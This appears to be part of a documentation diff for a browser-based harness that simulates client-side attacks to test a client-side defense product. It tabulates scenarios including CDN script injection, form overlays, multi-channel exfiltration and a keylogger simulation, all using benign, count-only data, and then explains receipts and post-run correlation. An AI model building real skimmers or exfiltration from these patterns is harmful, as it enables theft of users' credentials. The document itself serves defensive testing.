+| `multi-cdn-injection`             | `/`           | Inject the four documented benign CDN candidates.                                                                                                                              | Exactly four attempts, each retaining its own response, loading-failed, or timed-out outcome; console markers; cleanup.               | Only the subset the platform observes.                                         | Never claim all four loaded or were detected; failures remain evidence.                                  |
+| `tag-manager-hijack`              | `/`           | Inject the fixed Chart.js candidate with run-scoped `data-tag-manager` metadata, then count/discard form values.                                                               | Element and tag metadata; Network terminal state; optional field count; cleanup.                                                      | jsDelivr/Chart.js and form observations if present.                            | The tag metadata simulates semantics; it does not prove platform attribution.                            |
+| `multi-channel-exfiltration`      | `/#/login`    | Count/discard login values, then attempt one fetch POST, one image beacon, and one link prefetch with count-only data.                                                         | Counts/discard marker; all three channel attempts with terminal or timed-out states; cleanup.                                         | Field/script evidence and destinations actually observed.                      | Browser attempts are not detection proof; CSD views may emphasize script-source domains.                 |
+| `high-volume-domain-exfiltration` | `/#/login`    | Count/discard fields, inject five documented script candidates, and attempt two benign POSTs.                                                                                  | Exactly seven network attempt records: five script outcomes and two POST outcomes; field counts; cleanup.                             | Observed subset of scripts, domains, and form fields.                          | “High volume” means a bounded seven-attempt fixture, not volumetric load or seven guaranteed detections. |
+| `form-overlay`                    | `/#/login`    | Count original fields, cover the existing form with a run-scoped synthetic overlay, verify geometry/presence, then remove it.                                                  | Original-field count; overlay DOM and geometry evidence; no overlay input values; cleanup proof.                                      | Original-field/script access if observed.                                      | Dynamic fields are not promised as a standalone CSD signal.                                              |
+| `keylogger-simulation`            | `/#/login`    | Attach a run-scoped keydown counter, generate synthetic events without retaining keys or target identity, periodically POST aggregate counts, then detach and clear its timer. | Listener attached; aggregate event and periodic flush/POST counts; key-discard marker; request outcomes; listener/timer cleanup.      | Form/script access and destination telemetry if observed.                      | Counts prove event handling only; no keystrokes or fixed-time classification are retained.               |
+| `maximum-detection`               | `/#/login`    | Compose the canonical field-observation, multi-CDN, multi-channel request, and DOM-banner primitives under one run ID.                                                         | Child primitives listed; combined console and Network evidence; every candidate outcome; banner cleanup; one run ID.                  | Observed subset across scripts, domains, fields, and dashboard/user telemetry. | Maximum attempted signal coverage does not guarantee every load, telemetry surface, or classification.   |
+
+<!-- markdownlint-enable MD013 -->
+
+## Reading the receipt
+
+The receipt records schema/run/start/end/duration, the tool name and Node runtime, requested scenarios,
+target origin and routes, the exact allowlist, sanitized CDP endpoint, per-scenario assertions and
+markers, sanitized Log/console messages, Network terminal outcomes, protected-document and
+instrumentation evidence, cleanup, aggregate success/caveats, and a separate
+`eventual_csd_evidence` field that remains `null` until a separate correlation operation records it.
+
+When a receipt destination was requested, the runner writes it atomically even after execution or
+cleanup failure. The primary error remains distinct from cleanup errors. A failed CDN candidate is
+an observed terminal outcome, not a hidden success and not automatically a harness failure.
+
+Do not commit receipts. Store them beneath `.artifacts/` or another ignored private directory.
+
+## Explicit post-receipt CSD correlation
+
+The runner performs no platform API calls. Only after the immediate receipt passes, separately use
+read-only `xcsh_api` operations scoped to its start/end window, protected origin, and exact reviewed
+hosts recorded by its Network evidence. Record results under the separate eventual-evidence concept
+as `OBSERVED`, `NOT_OBSERVED`, `PENDING`, or `ERROR`. Temporal proximity is correlation, not proof
+of causation; no fixed polling interval or complete classification is guaranteed.
